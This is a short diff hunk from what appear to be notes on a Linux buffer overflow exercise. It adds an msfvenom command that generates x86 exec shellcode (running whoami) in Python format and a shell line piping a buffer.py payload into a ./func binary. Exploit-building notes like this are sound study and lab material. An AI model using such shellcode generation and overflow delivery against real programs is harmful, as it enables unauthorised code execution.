@@ -759,3 +759,13 @@ info proc map
 f7de1000
 
 ffffe000
+
+```
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+```
+
+or you can load up msfconsole.
+
+```
+./func <<<$(./buffer.py)
+```
